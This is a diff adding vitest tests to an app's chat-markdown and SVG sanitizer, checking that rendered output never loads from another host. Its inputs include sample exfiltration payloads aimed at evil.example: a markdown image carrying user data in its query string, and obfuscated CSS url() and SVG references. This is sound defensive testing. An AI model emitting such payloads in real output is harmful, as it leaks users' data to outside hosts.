@@ -4,7 +4,7 @@
 // LessonReader and ResourcesTab call, and through the library SVG sanitizer the Resources tab uses.
 import { beforeAll, describe, expect, it } from "vitest";
 import { ensureChatKatex, renderChatMarkdown } from "./chat-markdown";
-import { sanitizeHtml, sanitizeSvg } from "./sanitize-html";
+import { isLocalUrl, sanitizeHtml, sanitizeSvg } from "./sanitize-html";
 import flowchartSvg from "../../public/library/assets/arts-music-cs/flowchart-symbols.svg?raw";
 
 // Script hosts, plus tags that are script-free but still unsafe inline: global CSS (<style>), forms that
@@ -173,4 +173,132 @@ describe("sanitizeSvg (Resources tab card diagrams)", () => {
     const count = (s: string, tag: string) => (s.match(new RegExp(`<${tag}[\\s>]`, "g")) ?? []).length;
     for (const tag of ["text", "rect", "path"]) expect(count(svg, tag)).toBe(count(raw, tag));
   });
+});
+
+// #284: anything that would make the webview fetch from another host. Walks the parsed output for every
+// attribute or CSS that loads a URL and returns the ones that aren't data:, blob: or same-origin.
+function remoteLoads(html: string): string[] {
+  const doc = new DOMParser().parseFromString(`<body>${html}</body>`, "text/html");
+  const remote = (u: string) => {
+    try {
+      const url = new URL(u.trim(), location.href);
+      return !["data:", "blob:"].includes(url.protocol) && url.origin !== location.origin;
+    } catch {
+      return true;
+    }
+  };
+  const found: string[] = [];
+  for (const el of Array.from(doc.body.querySelectorAll("*"))) {
+    const tag = el.tagName.toLowerCase();
+    if (tag === "style" && /url\(|@import|image-set/i.test(el.textContent ?? "")) found.push(`<style>${el.textContent}`);
+    for (const attr of Array.from(el.attributes)) {
+      const name = attr.name.toLowerCase();
+      if (name === "srcset") found.push(`${tag}[srcset]`);
+      if (["src", "poster", "background", "data"].includes(name) && remote(attr.value)) found.push(`${tag}[${name}]`);
+      if ((name === "href" || name === "xlink:href") && tag !== "a" && remote(attr.value)) found.push(`${tag}[${name}]`);
+      for (const m of attr.value.matchAll(/url\(\s*["']?([^"')]*)/gi)) if (remote(m[1])) found.push(`${tag}[${name}=${attr.value}]`);
+      if (/image-set|\\/i.test(attr.value) && name === "style") found.push(`${tag}[style=${attr.value}]`);
+    }
+  }
+  return found;
+}
+
+describe("renderChatMarkdown: nothing in the output loads from another host (#284)", () => {
+  it("drops the src of a markdown image that points at a remote host, keeping its alt text", () => {
+    const html = renderChatMarkdown("Here: ![a cat](https://evil.example/p.png?q=my+name+is+sam)");
+    expect(remoteLoads(html)).toEqual([]);
+    expect(html).not.toContain("evil.example");
+    expect(html).toContain('alt="a cat"');
+  });
+
+  it("drops remote src, srcset, poster and background on raw HTML media", () => {
+    const html = renderChatMarkdown(
+      '<img src="https://evil.example/a.png"> <img src="//evil.example/b.png"> <img src="\\\\evil.example\\c.png"> ' +
+        '<img srcset="https://evil.example/d.png 1x, https://evil.example/e.png 2x"> ' +
+        '<picture><source srcset="https://evil.example/f.png"><img src="https://evil.example/g.png"></picture> ' +
+        '<video src="https://evil.example/h.mp4" poster="https://evil.example/i.png"><source src="https://evil.example/j.mp4"><track src="https://evil.example/k.vtt"></video> ' +
+        '<audio src="https://evil.example/l.mp3"></audio> ' +
+        '<table background="https://evil.example/m.png"><tr><td background="https://evil.example/n.png">x</td></tr></table>',
+    );
+    expect(remoteLoads(html)).toEqual([]);
+    expect(html).not.toContain("evil.example");
+  });
+
+  it("drops remote SVG <image>, <feImage>, <pattern> refs and url() paint", () => {
+    const html = renderChatMarkdown(
+      '<svg><image href="https://evil.example/a.png"/><image xlink:href="https://evil.example/b.png"/>' +
+        '<filter id="f"><feImage href="https://evil.example/c.png"/></filter>' +
+        '<pattern id="p" href="https://evil.example/d.svg#p"/>' +
+        '<rect width="5" height="5" fill="url(https://evil.example/e.svg#g)" filter="url(\'https://evil.example/f.svg#f\')"/></svg>',
+    );
+    expect(remoteLoads(html)).toEqual([]);
+    expect(html).not.toContain("evil.example");
+    expect(html).toContain("<rect");
+  });
+
+  it("drops inline styles that load a remote URL, escaped or not", () => {
+    const html = sanitizeHtml(
+      '<div style="background-image:url(https://evil.example/a.png)">a</div>' +
+        '<div style="background:\\75 rl(https://evil.example/b.png)">b</div>' +
+        '<div style="background:U/**/RL(https://evil.example/c.png)">c</div>' +
+        "<div style=\"background-image:image-set('https://evil.example/d.png' 1x)\">d</div>" +
+        '<div style="cursor:url(//evil.example/e.cur),auto">e</div>' +
+        '<span style="list-style-image:url(&quot;https://evil.example/f.png&quot;)">f</span>',
+    );
+    expect(remoteLoads(html)).toEqual([]);
+    expect(html).not.toContain("evil.example");
+    for (const t of ["a", "b", "c", "d", "e", "f"]) expect(html).toContain(`>${t}</`);
+  });
+
+  it("keeps data: and same-origin images, ordinary links and local url(#id) refs", () => {
+    const png = "data:image/png;base64,iVBORw0KGgo=";
+    const html = renderChatMarkdown(
+      `![dot](${png}) <img src="/library/assets/x.svg" alt="local"> [docs](https://example.com) ` +
+        '<svg><defs><marker id="ah"/></defs><line x2="5" marker-end="url(#ah)"/></svg>',
+    );
+    expect(remoteLoads(html)).toEqual([]);
+    expect(html).toContain(`src="${png}"`);
+    expect(html).toContain('src="/library/assets/x.svg"');
+    expect(html).toContain('<a href="https://example.com">docs</a>');
+    expect(html).toContain('marker-end="url(#ah)"');
+  });
+});
+
+describe("sanitizeSvg: a library card can't load from another host (#284)", () => {
+  it("drops a <style> that imports or fetches remotely, and remote image/paint refs", () => {
+    const svg = sanitizeSvg(
+      '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">' +
+        "<style>@import url(https://evil.example/a.css); text{fill:#111}</style>" +
+        '<image href="https://evil.example/b.png"/><image xlink:href="https://evil.example/c.png"/>' +
+        '<rect width="5" height="5" fill="url(https://evil.example/d.svg#g)" style="fill:url(https://evil.example/e.svg#g)"/></svg>',
+    );
+    expect(remoteLoads(svg)).toEqual([]);
+    expect(svg).not.toContain("evil.example");
+    expect(svg).toContain("<rect");
+  });
+
+  it("keeps a real library card's <style> and its local marker refs", () => {
+    const svg = sanitizeSvg(flowchartSvg);
+    expect(remoteLoads(svg)).toEqual([]);
+    expect(svg).toContain("<style");
+    expect(svg).toContain('marker-end="url(#ah)"');
+  });
+});
+
+describe("isLocalUrl: the page origins the app runs at", () => {
+  // Windows serves the app from http://tauri.localhost; macOS/Linux from tauri://localhost, whose
+  // URL.origin is "null", so same-origin must not be decided by URL.origin.
+  for (const page of ["http://tauri.localhost/", "tauri://localhost/", "http://localhost:1420/"]) {
+    it(`treats fragment, relative, data: and blob: URLs as local at ${page}`, () => {
+      for (const u of ["#ah", " #ah ", "/library/assets/x.svg", "x.png", "data:image/png;base64,AA==", "blob:abc"]) {
+        expect(isLocalUrl(u, page), u).toBe(true);
+      }
+    });
+
+    it(`treats other hosts as remote at ${page}`, () => {
+      for (const u of ["https://evil.example/a.png", "//evil.example/a.png", "http://127.0.0.2/a.png", "https:"]) {
+        expect(isLocalUrl(u, page), u).toBe(false);
+      }
+    });
+  }
 });
